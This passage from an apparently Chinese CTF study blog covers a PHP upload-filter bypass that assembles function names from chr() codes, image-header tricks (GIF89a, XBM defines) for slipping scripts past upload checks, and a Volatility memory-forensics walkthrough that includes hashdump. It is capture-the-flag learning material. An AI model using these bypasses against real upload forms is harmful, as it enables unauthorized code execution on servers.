&#123;</span><br><span class="line">                $is_upload=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> $img_path;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请重新上传！&#x27;</span>;</span><br><span class="line">        mkdir(UPLOAD_PATH,<span class="number">775</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>可见对危险函数进行了过滤，可以使用aiisc码拼接动态构造函数来绕过。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">112</span>).chr(<span class="number">104</span>).chr(<span class="number">112</span>).chr(<span class="number">105</span>).chr(<span class="number">110</span>).chr(<span class="number">102</span>).chr(<span class="number">111</span>);</span><br><span class="line">$a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>上传文件</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716235614.png" alt="微信截图_20200716235614"></p>
<ul>
<li>成功执行代码</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716235728.png" alt="微信截图_20200716235728"></p>
<ul>
<li>使用如下代码快速生成指定函数</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h4><h4 id="XMB文件头绕过"><a href="#XMB文件头绕过" class="headerlink" title="XMB文件头绕过"></a>XMB文件头绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure>

<h4 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Ez-qr"><a href="#Ez-qr" class="headerlink" title="Ez-qr"></a>Ez-qr</h4><ul>
<li>解法一</li>
</ul>
<p>前提条件</p>
<ul>
<li>在sublime上装好python</li>
<li>python中添加PIL库</li>
</ul>
<p>打开flag文件看到一对一对的数字，其实对应的就是坐标的位置，这里可以使用python的PIL库处理图片，建立一个全黑的背景(0,0,0)，然后把文本中出现的所有坐标的点替换为白色，可以得到一张二维码，扫描即可有flag。</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">300</span>,<span class="number">300</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="comment">#创建Image对象</span></span><br><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>)<span class="comment">#打开flag.txt文件</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]),int(point[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="comment">#读取文件中的每一行，并修改像素</span></span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<ul>
<li>解法二</li>
</ul>
<p>使用kail工具gnuplot一键转化为二维码。</p>
<h4 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h4><ul>
<li>kailinux自带的专业内存取证软件Volatility</li>
</ul>
<p>通用格式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f &lt;filename&gt; --profile=&lt;配置名&gt; &lt;cmd&gt; &lt;option&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>安装</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install volatility</span><br></pre></td></tr></table></figure>

<h5 id="从实战中学习使用Volatility"><a href="#从实战中学习使用Volatility" class="headerlink" title="从实战中学习使用Volatility"></a>从实战中学习使用Volatility</h5><h5 id="查看镜像信息"><a href="#查看镜像信息" class="headerlink" title="查看镜像信息"></a>查看镜像信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw imageinfo</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200728221140367.png" alt="image-20200728221140367"></p>
<ul>
<li>得到系统为WinXPSP2x86</li>
</ul>
<h5 id="获取进程信息"><a href="#获取进程信息" class="headerlink" title="获取进程信息"></a>获取进程信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 文件名 --profile=dump的系统版本  命令</span><br></pre></td></tr></table></figure>

<ul>
<li>对应这里是WinXPSP2x86，执行查看进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw --profile=WinXPSP2x86  pslist</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200728222459957.png" alt="image-20200728222459957"></p>
<h5 id="提取进程dump"><a href="#提取进程dump" class="headerlink" title="提取进程dump"></a>提取进程dump</h5><ul>
<li>使用例子</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 文件 --profile=版本 memdump -p [PID] -D [dump 出的文件保存的目录]</span><br></pre></td></tr></table></figure>

<ul>
<li>例如提取smss.exe进程的dump</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw --profile=WinXPSP2x86  memdump -p 536 -D ./</span><br></pre></td></tr></table></figure>

<ul>
<li>搜索该文件关于<code>flag</code>的内容</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -e l ./536.dmp | grep flag</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200728221743464.png" alt="image-20200728221743464"></p>
<h5 id="cmdscan"><a href="#cmdscan" class="headerlink" title="cmdscan"></a>cmdscan</h5><ul>
<li>获取cmd输入的内容：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw --profile=WinXPSP2x86  cmdscan</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200728222548407.png" alt="image-20200728222548407"></p>
<h5 id="filescan"><a href="#filescan" class="headerlink" title="filescan"></a>filescan</h5><ul>
<li>filescan会扫描内存中所有文件，而我们只需要在其中找到hint.txt即可所以使用grep命令进行筛选</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw --profile=WinXPSP2x86  filescan | grep hint.txt</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200728222754050.png" alt="image-20200728222754050"></p>
<h5 id="dump文件"><a href="#dump文件" class="headerlink" title="dump文件"></a>dump文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像文件 --profile=系统版本 dumpfiles -Q 文件地址 --dump-dir=导出地址</span><br></pre></td></tr></table></figure>

<ul>
<li>提取hint.txt</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002456028 --dump-dir=./</span><br></pre></td></tr></table></figure>

<h5 id="分析文件"><a href="#分析文件" class="headerlink" title="分析文件"></a>分析文件</h5><p>把提取之后的hint.txt文件拖进010编辑器分析</p>
<p><img src="http://img.kawhi.xyz/image-20200728223336499.png" alt="image-20200728223336499"></p>
<p>提示fl4g文件的存在，重复filescan和dump文件的操作</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f zy.raw --profile=WinXPSP2x86  filescan | grep fl4g</span><br><span class="line">volatility -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002052028 --dump-dir=./</span><br></pre></td></tr></table></figure>

<p><img src="http://img.kawhi.xyz/image-20200728223734169.png" alt="image-20200728223734169"></p>
<p>把提取出来的文件改后缀为zip，解压后发现两张一模一样的照片，很容易联想到是图片对比。打开图片分析神器<strong>Stegsolve</strong>，先点击File-&gt;open打开flag.png，再点击Analyse-&gt;Image Combiner打开flag.jpg，点击下方的&gt;调到sub模式即可得到二维码。</p>
<p><img src="http://img.kawhi.xyz/image-20200728224538820.png" alt="image-20200728224538820"></p>
<p>扫描二维码即可得到flag</p>
<h5 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h5><ul>
<li>获取浏览器浏览历史</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像文件 --profile=系统版本 iehistory</span><br><span class="line">volatility -f zy.raw --profile=WinXPSP2x86 iehistory</span><br></pre></td></tr></table></figure>

<ul>
<li>搜索图片</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像名 --profile=系统版本 filescan | grep -E &#x27;jpg|png|jpeg|bmp|gif&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看网络连接情况</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像名 --profile=系统版本 netscan</span><br></pre></td></tr></table></figure>

<ul>
<li>hashdump（提取系统用户HASH）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像名 --profile=系统版本 hashdump</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/09/30/hello-world/" rel="prev" title="Hello World">
      <i class="fa fa-chevron-left"></i> Hello World
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">代码审计基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E7%9A%844%E7%A7%8D%E6%A0%87%E8%AE%B0%E9%A3%8E%E6%A0%BC"><span class="nav-number">1.0.1.</span> <span class="nav-text">PHP的4种标记风格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F"><span class="nav-number">1.0.2.</span> <span class="nav-text">变量与常量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E7%A7%8D%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%87%BA"><span class="nav-number">1.0.3.</span> <span class="nav-text">几种基本输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%94%AF%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.0.4.</span> <span class="nav-text">分支语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84-%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84"><span class="nav-number">1.0.5.</span> <span class="nav-text">PHP中的数组&#x2F;遍历数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E9%99%86%E4%BF%9D%E6%8C%81"><span class="nav-number">1.0.6.</span> <span class="nav-text">登陆保持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%A4%E7%A7%8D%E5%9F%BA%E6%9C%AC%E7%9A%84HTTP%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.0.7.</span> <span class="nav-text">使用两种基本的HTTP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E4%B8%8E%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.0.8.</span> <span class="nav-text">Mysql数据库连接与查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.0.9.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#include-require"><span class="nav-number">1.0.9.1.</span> <span class="nav-text">include&#x2F;require</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.9.2.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">1.0.9.2.1.</span> <span class="nav-text">利用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.9.2.1.1.</span> <span class="nav-text">执行任意命令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">1.0.9.2.1.2.</span> <span class="nav-text">任意文件读取</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="nav-number">1.0.10.</span> <span class="nav-text">SQL注入漏洞的基本原理、利用和防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%BE%E6%B3%A8"><span class="nav-number">1.0.10.0.1.</span> <span class="nav-text">显注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="nav-number">1.0.10.0.1.1.</span> <span class="nav-text">判断字段数量</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%BE%E6%B3%A8%E7%82%B9"><span class="nav-number">1.0.10.0.1.2.</span> <span class="nav-text">判断显注点</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="nav-number">1.0.10.0.1.3.</span> <span class="nav-text">查询数据</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.0.10.0.2.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.0.10.0.2.1.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.0.10.0.2.2.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.10.0.3.</span> <span class="nav-text">SQL注入防御方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98"><span class="nav-number">1.0.11.</span> <span class="nav-text">弱类型比较问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9C-%E2%80%9D-%E4%B8%8E%E2%80%9C-%E2%80%9D"><span class="nav-number">1.0.11.1.</span> <span class="nav-text">“&#x3D;&#x3D;” 与“&#x3D;&#x3D;&#x3D;”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#switch%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98"><span class="nav-number">1.0.11.2.</span> <span class="nav-text">switch弱类型比较问题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5-%E3%80%81sha1-%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9B%B8%E7%AD%89%E9%97%AE%E9%A2%98"><span class="nav-number">1.0.11.3.</span> <span class="nav-text">MD5() 、sha1()哈希函数相等问题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98"><span class="nav-number">1.0.11.4.</span> <span class="nav-text">十六进制比较问题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HASH%E6%AF%94%E8%BE%83%E6%93%8D%E4%BD%9C%E7%AC%A6%E9%97%AE%E9%A2%98"><span class="nav-number">1.0.11.5.</span> <span class="nav-text">HASH比较操作符问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="nav-number">1.0.12.</span> <span class="nav-text">XSS漏洞的基本原理、利用和防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%95%E4%B8%BAXSS%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.12.1.</span> <span class="nav-text">何为XSS漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-number">1.0.12.2.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">1.0.12.3.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">1.0.12.4.</span> <span class="nav-text">DOM-XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.13.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.0.13.1.</span> <span class="nav-text">利用命令执行读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96shell%EF%BC%88%E6%B2%A1%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E4%B8%8A%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%95%E8%AF%95%EF%BC%89"><span class="nav-number">1.0.13.2.</span> <span class="nav-text">利用命令执行获取shell（没有服务器的可以自己上两台虚拟机试试）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.13.3.</span> <span class="nav-text">长度限制执行命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.14.</span> <span class="nav-text">远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.14.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.0.14.2.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.0.14.3.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">1.0.14.4.</span> <span class="nav-text">方法三</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="nav-number">1.0.14.5.</span> <span class="nav-text">方法四</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E6%83%85%E5%86%B5"><span class="nav-number">1.0.14.6.</span> <span class="nav-text">跳转目录情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">1.0.14.7.</span> <span class="nav-text">其他小技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.0.14.8.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.15.</span> <span class="nav-text">SSRF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.15.1.</span> <span class="nav-text">data伪协议构造绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%8D%8F%E8%AE%AE%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.15.2.</span> <span class="nav-text">不存在协议头绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IP%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.15.3.</span> <span class="nav-text">IP限制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%9E%E7%8E%AF%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.15.3.1.</span> <span class="nav-text">回环地址绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#localhost"><span class="nav-number">1.0.15.3.2.</span> <span class="nav-text">localhost</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%89%B9%E6%AE%8AIP%E7%BB%95%E8%BF%87IP%E9%99%90%E5%88%B6"><span class="nav-number">1.0.15.3.3.</span> <span class="nav-text">特殊IP绕过IP限制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get-headers-%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.15.4.</span> <span class="nav-text">get_headers 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Curl%E9%80%A0%E6%88%90%E7%9A%84SSRF"><span class="nav-number">1.0.15.5.</span> <span class="nav-text">Curl造成的SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8Curl%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.15.5.1.</span> <span class="nav-text">双url绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#X-Forwarded-For%E7%BB%95%E8%BF%87%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="nav-number">1.0.15.6.</span> <span class="nav-text">X-Forwarded-For绕过、Cookie伪造</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.16.</span> <span class="nav-text">无字符绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%BC%82%E6%88%96"><span class="nav-number">1.0.16.1.</span> <span class="nav-text">方法一(异或)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%8F%96%E5%8F%8D"><span class="nav-number">1.0.16.2.</span> <span class="nav-text">方法二(取反)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-number">1.0.16.3.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.0.16.4.</span> <span class="nav-text">题目</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.17.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 